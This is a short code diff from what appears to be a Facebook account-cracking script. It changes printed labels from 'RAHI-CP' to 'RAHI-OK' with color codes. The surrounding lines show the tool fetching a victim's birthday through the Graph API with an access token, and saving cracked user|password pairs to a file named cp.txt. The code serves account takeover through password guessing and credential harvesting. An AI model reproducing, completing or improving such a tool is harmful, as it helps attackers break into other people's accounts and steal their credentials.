@@ -345,7 +345,7 @@ class __xxx__:
                             f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                         month, day, year = cp_ttl.split('/')
                         month = bulan_ttl[month]
-                        print('\r%s[RAHI-CP] %s | %s ' % (M, user, pw))
+                        print('\r%s\033[1;92m[RAHI-OK] %s | %s ' % (M, user, pw))
                         wrt = '%s|%s' % (user, pw)
                         cp.append(wrt)
                         open('cp.txt', 'a').write('%s\n' % wrt)
@@ -356,7 +356,7 @@ class __xxx__:
                         year = ''
                     except:
                         pass
-                    print('\r%s[RAHI-CP] %s | %s ' % (M, user, pw))
+                    print('\r%s\033[1;92m[RAHI-OK] %s | %s ' % (M, user, pw))
                     wrt = '%s|%s' % (user, pw)
                     cp.append(wrt)
                     open('cp.txt', 'a').write('%s\n' % wrt)
